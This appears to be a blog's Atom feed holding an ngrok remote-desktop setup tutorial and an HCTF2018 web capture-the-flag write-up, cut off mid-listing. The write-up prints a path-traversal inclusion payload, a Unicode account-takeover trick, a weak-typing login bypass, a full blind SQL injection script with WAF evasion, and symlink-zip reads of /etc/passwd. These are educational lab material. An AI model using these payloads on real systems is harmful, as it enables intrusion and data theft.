<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zer0&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zcluslloye.cn/"/>
  <updated>2019-04-03T09:42:36.725Z</updated>
  <id>http://zcluslloye.cn/</id>
  
  <author>
    <name>Zer0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用ngrok实现内网远程桌面</title>
    <link href="http://zcluslloye.cn/2019/04/01/ngrok/"/>
    <id>http://zcluslloye.cn/2019/04/01/ngrok/</id>
    <published>2019-04-01T14:20:28.000Z</published>
    <updated>2019-04-03T09:42:36.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打算在机房里面用自己的电脑，笔记本太重不想背在身上，就决定使用远程控制。之前一直在用teamviewer，这几天在想为什么不用远程桌面呢，于是我便开始研究如何内网穿透使笔记本的3389端口暴露到公网上。<br>网上找了几种方法，无非就是那几个在国内比较有名的产品，花生壳和nat123。当然他们也不都是免费的，免费的也有种种限制，后来找到了ngrok来进行内网穿透，ngrok1.x是开源的，我便想使用ngrok来完成想法。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol><li>一台有公网ip的vps服务器</li><li>一个任意域名</li></ol><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h2><p>由于ngrok使用go语言编写的，需要先安装go环境。<br>先到golang官网下载<a href="https://dl.google.com/go/go1.12.1.linux-amd64.tar.gz" target="_blank" rel="noopener">linux安装包</a><br>执行<code>sudo tar zxvf go1.12.1.linux-amd64.tar.gz -C /usr/local</code><br>之后配置环境变量<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">//添加</span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/root/program_develop/go_demo</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br><span class="line">//使环境变量生效</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><br>执行<code>go version</code>出现版本就安装成功了。</p><h2 id="域名DNS解析设置"><a href="#域名DNS解析设置" class="headerlink" title="域名DNS解析设置"></a>域名DNS解析设置</h2><p>首先将一个子域名解析到自己的服务器上，例如我将remote.xxxxx.com 解析到自己的服务器ip上（A记录）.随后将 *.remote.xxxxx.com 解析到remote.xxxxx.com上（CNAME类型）。<br>至此DNS设置告一段落。</p><h2 id="安装ngrok"><a href="#安装ngrok" class="headerlink" title="安装ngrok"></a>安装ngrok</h2><h3 id="下载ngrok"><a href="#下载ngrok" class="headerlink" title="下载ngrok"></a>下载ngrok</h3><p>先下载ngrok源码，然后切换到目录<br><code>git clone https://github.com/inconshreveable/ngrok.git</code><br><code>cd ngrok</code></p><h3 id="生成证书与替换证书"><a href="#生成证书与替换证书" class="headerlink" title="生成证书与替换证书"></a>生成证书与替换证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//生成</span><br><span class="line"><span class="built_in">export</span> NGROK_DOMAIN=<span class="string">"remote.xxxxx.com"</span></span><br><span class="line">openssl genrsa -out rootCA.key 2048</span><br><span class="line">openssl req -x509 -new -nodes -key rootCA.key -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -days 5000 -out rootCA.pem</span><br><span class="line">openssl genrsa -out device.key 2048</span><br><span class="line">openssl req -new -key device.key -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -out device.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000</span><br><span class="line"></span><br><span class="line">//替换</span><br><span class="line">cp rootCA.pem assets/client/tls/ngrokroot.crt</span><br><span class="line">cp device.crt assets/server/tls/snakeoil.crt</span><br><span class="line">cp device.key assets/server/tls/snakeoil.key</span><br></pre></td></tr></table></figure><h3 id="编译linux服务端"><a href="#编译linux服务端" class="headerlink" title="编译linux服务端"></a>编译linux服务端</h3><p><code>GOOS=linux GOARCH=amd64 make release-server</code></p><h3 id="编译windows客户端"><a href="#编译windows客户端" class="headerlink" title="编译windows客户端"></a>编译windows客户端</h3><p><code>GOOS=windows GOARCH=amd64 make release-client</code><br>无论是编译客户端还是服务端，都会在ngrok/bin目录下生成可执行文件。</p><h2 id="运行与使用"><a href="#运行与使用" class="headerlink" title="运行与使用"></a>运行与使用</h2><h3 id="在服务器上"><a href="#在服务器上" class="headerlink" title="在服务器上"></a>在服务器上</h3><p>进入ngrok/bin目录，执行<code>./ngrokd -domain=&quot;remote.xxxxx.com&quot; -httpAddr=&quot;:8001&quot; -httpsAddr=&quot;:4443&quot; -tunnelAddr=&quot;:8083&quot;</code><br>这里由于服务器的80和443端口被占用，就换了任意一个端口来侦听http和https，当然我们用不到这个。其次我使用了一个端口来侦听客户端的服务，客户端也是通过这个端口来使用ngrok。<br>还有，如果是想后台运行，建议使用screen或者nohub命令来实现。<br>然后到云服务器的安全组中放行这些端口（不要忘记3389），以保证服务正常运行。</p><h3 id="在个人电脑上"><a href="#在个人电脑上" class="headerlink" title="在个人电脑上"></a>在个人电脑上</h3><p>首先先开启本机的远程桌面服务（好像是要win10专业版才能使用远程桌面，具体请参照微软官网。）<br>然后防火墙放行3389端口。<br>将服务器上的ngrok/bin/windows_amd64/ngrok.exe拷贝到个人电脑上，然后在同目录下创建<br>ngrok.cfg和ngrok.bat两个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//ngrok.cfg</span><br><span class="line">server_addr: &quot;remote.xxxxx.com:8083&quot;</span><br><span class="line">trust_host_root_certs: false</span><br><span class="line">tunnels:</span><br><span class="line">  mstsc:</span><br><span class="line">    remote_port: 3389</span><br><span class="line">    proto:</span><br><span class="line">      tcp: &quot;127.0.0.1:3389&quot;</span><br><span class="line"></span><br><span class="line">//ngrok.bat</span><br><span class="line">ngrok.exe -config=ngrok.cfg start mstsc</span><br></pre></td></tr></table></figure><br>双击ngrok.bat文件，显示状态为online就成功了，在远程桌面连接中输入remote.xxxxx.com便可以开始使用远程桌面了。</p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>虽然实现了远程桌面，但其实效果并不是特别好，其主要原因还是vps限制了速率，毕竟学生机只有1M的带宽，如果有4M以上的带宽也许能顺畅一点，不过1M的速率简单使用也就已经足够了。<br>后来我又将本机的FTP服务穿透到公网，在由于IIS无法设置主被动模式，导致无法正常使用IIS自带的FTP服务，也只好作罢。理论上使用可以设置端口的其他软件搭建的FTP服务，就能成功穿透，但速度也是堪忧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近打算在机房里面用自己的电脑，笔记本太重不想背在身上，就决定使用远程控制。之前一直在用teamviewer，这几天在想为什么不用远程桌面呢
      
    
    </summary>
    
    
      <category term="web" scheme="http://zcluslloye.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018 web部分Writeup</title>
    <link href="http://zcluslloye.cn/2018/11/12/hctf2018wp/"/>
    <id>http://zcluslloye.cn/2018/11/12/hctf2018wp/</id>
    <published>2018-11-12T12:20:28.000Z</published>
    <updated>2018-11-14T09:20:19.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周末忙着准备期中考试，HCTF也只是匆匆看了几题，有个思路之后就没再做了，这两天趁着服务器还没关闭来重新复现一下，相比去年的HCTF，今年题目自己也能有点思路了，不过相比出题人，自己还是差了不少，废话不多说，看各个题目。</p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>一道文件包含题。访问查看注释发现有源代码。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/warmup01.png" alt=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>可以知道emmm中的checkFile有变量将$_GET[‘file’]以”?”为分隔符分为几部分，只要在”?”前的变量在白名单中就可以返回true。<br>结合提示”flag not here, and flag in ffffllllaaaagggg”,构造file=hint.php?../../../../../ffffllllaaaagggg拿到flag。</p><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>这道题正解应该是通过Unicode字符来注册一个在执行strlower函数后用户名为admin的账户从而获得flag。<br>我们先是在change下看到了注释，去GitHub上拿到源码（听说有队伍直接在GitHub上搜索就搜索到了）。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin02.png" alt=""><br>在tamplates/index.html 下可以看到只要session[‘name’] == ‘admin’ 就可以看到flag。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin03.png" alt="">我的第一直觉是伪造session来获得admin的登录态，这是出题人的非预期吧，稍后讲。<br>在app/routes.py的第41,63和84行的注册，登录和更改密码处发现了strlower函数。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin04.png" alt=""><br>随后在第106行发现strlower的定义。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin05.png" alt=""><br>在注册的时候将用户名strlower带入数据库查询，登录的时候也使用strlower查询，而登录之后更改密码又再一次使用了strlower，<b>也就是说登录之后的用户名会进行两次strlower</b>。这就导致了某些形如字母的Unicode字符在经过strlower变成字母，第二次strlower之后变为小写字母。<br>举个例子，”\u1d2c”经过Unicode解码之后变为”ᴬ”，我们注册一个名为ᴬdmin的用户，在登录的时候session[‘name’]变为”Admin”，在修改密码的时候又变为”admin”，这使得我们可以越权修改admin的密码，修改完后登录上去就可以看到flag。(这个漏洞目前在新版本的Twisted中已被修复)<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin01.png" alt=""><br>再来谈谈session伪造。由于出题人的疏忽，不小心在源码中泄露了SECRET_KEY。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/admin06.png" alt=""><br>这就导致可以通过本地构造session来构造admin的登录态。这和hideandseek有异曲同工之妙，将在后面仔细讲解。</p><h1 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h1><p>一道由Li4n0从钓鱼网站源码中修改代码而成的题目。<br>随便扫扫目录，发现&#119;ww.zip，就自己在本地搭了个环境，查看login.php发现使用了addslashes函数，但需要绕过safe.php中的waf<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>waf把能所有东西都过滤了，并且在login.php中还判断了数据库中的用户名和输入的用户名是否相等，导致post注入被堵死。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone02.png" alt=""><br>再次审计一下代码发现admin目录下的除login.php外都是由一个islogin变量来判断是否登录，<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone01.png" alt="">全局搜索一下发现islogin变量在/include/member.php中。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone03.png" alt="">我们看到了熟悉的json_decode还有双等号！在本次环境测试了一下发现<b>在输入Unicode编码的时候，json_decode会自动还原成字符</b>，这样我们既绕过了waf，又达到注入的目的，这个我们稍后再说。<br>先来讲讲下面的弱类型，我们可以通过发送cookie的login_data模拟admin登录态，并且我们知道服务器有admin用户但不知道admin密码，由于这个弱类型，我们可以通过number == $admin_pass的前几位来模拟登陆，使用burp最后跑出来的数字是65，也就是只要构造<br><code>login_data={&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:65}</code><br>就可以登陆后台系统。<b>但直接跑数字的话存在一个问题。</b>既当sha1($udata[‘password’] . LOGIN_KEY)中出现形如65e123a….之类的字符串时，那admin_pass就必须为65e123(e为科学计数法)。这点在我本地构造环境时让我频频出错，好在出题人并没有为难我们，毕竟这个脚本也不好跑。<br>登录后台后发现flag不在后台中，想想应该是在数据库中。现在讲讲注入。刚才讲过，json_decode会还原Unicode编码，并且waf里刚好没有过滤掉’/‘，在本地创个测试环境。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'login_data'</span>]))</span><br><span class="line">&#123;       </span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        var_dump($login_data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone04.png" alt=""><br>我们发现json_decode确实将Unicode编码还原成字符，接下来就好办了，在代码中如果没有查询到的话就会有四次setcookie，如果查询到就只有两次setcookie，或者根据弱类型跑出来的密码来判断是否登录，因此可以采用布尔盲注；当然也可以使用时间盲注，这里我采用布尔盲注。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/list.php"</span></span><br><span class="line">chars = [chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>)]</span><br><span class="line">table = []</span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = s.replace(<span class="string">' '</span>, <span class="string">"/**/"</span>).replace(<span class="string">"substr"</span>,<span class="string">"\\u0073ubstr"</span>).replace(<span class="string">"="</span>, </span><br><span class="line">    <span class="string">"\\u003d"</span>).replace(<span class="string">"ascii"</span>, <span class="string">"\\u0061scii"</span>).replace(<span class="string">"or"</span>,<span class="string">"\\u006fr"</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> database</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select database()),&#123;&#125;,1))=%27&#123;&#125;\",\"admin_pass\":65"</span></span><br><span class="line">            payload = <span class="string">"&#123;"</span> + payload.format(str(i),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">            payload = enc(payload)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">            &#125;</span><br><span class="line">            html = r.get(url,headers=headers)</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                database += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"database: "</span> + database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> table</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">                payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=%27&#123;2&#125;\",\"admin_pass\":65"</span></span><br><span class="line">                payload = <span class="string">"&#123;"</span> + payload.format(str(i),str(j),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">                payload = enc(payload)</span><br><span class="line">                headers = &#123;</span><br><span class="line">                    <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">                &#125;</span><br><span class="line">                html = r.get(url, headers=headers)</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                    table_name += char</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table.append(table_name)</span><br><span class="line">    print(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">"\"admin_user\":\"admin%27 and ascii(substr((select * from F1444g),&#123;0&#125;,1))=%27&#123;1&#125;\",\"admin_pass\":65"</span></span><br><span class="line">            payload = <span class="string">"&#123;"</span> + payload.format(str(i),ord(char)) + <span class="string">"&#125;"</span></span><br><span class="line">            payload = enc(payload)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'Cookie'</span>: <span class="string">"islogin=1;login_data="</span>+str(payload)</span><br><span class="line">            &#125;</span><br><span class="line">            html = r.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"window.location"</span> <span class="keyword">not</span> <span class="keyword">in</span> html.text):</span><br><span class="line">                flag += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_database()</span><br><span class="line">    get_table()</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><br>没有使用多线程跑起来真的慢，下次整理一篇多线程的文章。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/kzone05.png" alt=""></p><h1 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h1><p><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek01.png" alt=""><br>需要上传zip文件，上传随意文件发现没有啥卵用，想到前几个月某场比赛的一道题，随即试试上传软连接文件。<br>在linux下执行<br><code>ln -s /etc/passwd link</code>和<code>zip -y 1.zip link</code>上传后得到passwd文件，拿到一个任意文件读取。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/hideandseek02.png" alt=""><br>出题人第二天给了提示docker，读取下/proc/self/environ的环境变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=30b76592807cSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><br>找到了web服务器，读取/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure><br>这里/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py是运行中的文件，拿来看看<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 